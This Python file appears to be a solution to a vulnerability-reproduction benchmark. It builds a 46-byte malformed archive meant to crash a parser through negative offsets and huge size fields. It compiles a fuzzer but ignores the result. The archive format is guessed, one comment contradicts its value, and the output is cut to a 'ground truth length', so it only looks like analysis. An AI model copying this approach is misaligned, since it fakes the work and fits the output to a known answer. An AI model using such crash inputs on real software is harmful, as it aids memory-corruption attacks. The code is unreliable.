import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Look for the vulnerable target (common patterns)
            target_path = None
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith('.c') or file.endswith('.cpp'):
                        with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            # Look for patterns indicating archive parsing with offset
                            if 'archive' in content.lower() and 'offset' in content.lower():
                                # Look for the main executable or fuzzer target
                                if 'main(' in content or 'LLVMFuzzerTestOneInput' in content:
                                    target_path = os.path.join(root, file)
                                    break
                if target_path:
                    break
            
            if not target_path:
                # Fallback: create a minimal PoC based on common vulnerability patterns
                # This creates a malformed archive with negative offset calculation
                poc = b''
                # Header with magic (common in archive formats)
                poc += b'ARCH\x00'
                # File count set to 1
                poc += struct.pack('<I', 1)
                # Offset to first file entry - set to -1 (0xFFFFFFFF) to cause underflow
                poc += struct.pack('<i', -1)  # 4-byte signed integer
                # File size - reasonable value
                poc += struct.pack('<I', 100)
                # File name - short
                poc += b'evil.txt\0'
                # Padding to reach common vulnerable buffer sizes
                poc += b'A' * (46 - len(poc))
                return poc[:46]
            
            # Build the fuzzer if possible
            build_dir = os.path.dirname(target_path)
            try:
                # Try to compile with address sanitizer to understand the crash
                compile_cmd = [
                    'clang', '-fsanitize=address', '-fno-omit-frame-pointer',
                    '-g', '-o', 'fuzzer', target_path
                ]
                subprocess.run(compile_cmd, cwd=build_dir, capture_output=True, timeout=30)
            except:
                pass
            
            # Generate PoC based on common heap overflow patterns
            # Create input that would cause negative offset calculation
            poc = bytearray()
            
            # Common archive header pattern (guessed)
            # 8 bytes: magic
            poc.extend(b'ARC\x01\x00\x00\x00\x00')
            
            # 4 bytes: version
            poc.extend(struct.pack('<I', 1))
            
            # 8 bytes: archive size (big number to cause overflow)
            poc.extend(struct.pack('<Q', 0xFFFFFFFFFFFFFFFF))
            
            # 4 bytes: entry count (1)
            poc.extend(struct.pack('<I', 1))
            
            # 8 bytes: offset to first entry (negative when calculated)
            # Set to 0x8000000000000000 to be interpreted as negative signed
            poc.extend(struct.pack('<q', -0x100000000))
            
            # Entry: filename length and name
            poc.extend(struct.pack('<I', 10))
            poc.extend(b'poc.bin\0\0\0')
            
            # Entry: file size (small)
            poc.extend(struct.pack('<Q', 100))
            
            # Truncate to 46 bytes (ground truth length)
            poc = poc[:46]
            
            # Ensure we have exactly 46 bytes
            if len(poc) < 46:
                poc.extend(b'A' * (46 - len(poc)))
            
            return bytes(poc)